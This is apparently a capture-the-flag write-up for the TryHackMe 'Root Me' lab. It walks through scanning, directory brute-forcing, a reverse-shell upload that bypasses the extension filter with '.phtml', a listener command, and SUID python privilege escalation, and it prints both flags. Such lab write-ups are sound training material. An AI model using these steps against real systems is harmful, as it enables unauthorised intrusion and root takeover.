# Root Me
`url = https://tryhackme.com/room/rrootme`
`date = 01/19/2023`
---
## Enumeration

1. **Network Enumeration**
```bash
rustscan -a $IP --ulimit 6000 --scripts None
```
* Ports `22` & `80` are open which means that there is a website hosted & SSH/HTTP are the services. Hence, 2 ports are open.

2. **Directory Bruteforcing**
```bash
dirsearch -u http://$IP/
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
/uploads
/panel
/js
/index.php/login
```
* The `/uploads` page shows us the directory listing for this website.
* The `/panel` page allows you to upload files; mostly this page has an artbitrary file upload vuln.
* The `/js` page is just some 'typewriter' java script code. I dont think there is much use to it right now.
* `/index.php/login` page shows us a prompt that gives us the user name  - `root@rootme:~#`.
---

## Exploitation

* On uploading the file on `/panel` I see that ".php" files are not allowed. Which is why I first renmaes the file to `reshell.txt`, which succeeded but could not be executed. So I re-renamed the file to `revshell.phtml` which did the trick.

`pwncat-cs -lp 9999 # $LPORT`

* Shell received.
---

## Post Exploitation

1. Find the `user.txt` flag by literally searching for it in the root directory.
    ```bash
    find / -name "user.txt" -type f 2>/dev/null
    ```
which will give you the user flag - THM{y0u_g0t_a_sh3ll}

2. In order for us to switch user to root, we do some enumeration. We can check `cat /etc/crontab`. There are no crontabs. Another thing we can do is find SUID binaries in this machine --
Use command - `find / -perm -u=s -type f 2>/dev/null`
which returns -
```bash
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 python
```

3. For performing privesc, get the command from gtfobins -
`/usr/bin/python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’`

which should give you root. Now you can just -
```bash
cd /root
cat root.txt
```
this will give you the root flag - THM{pr1v1l3g3_3sc4l4t10n}

fin.
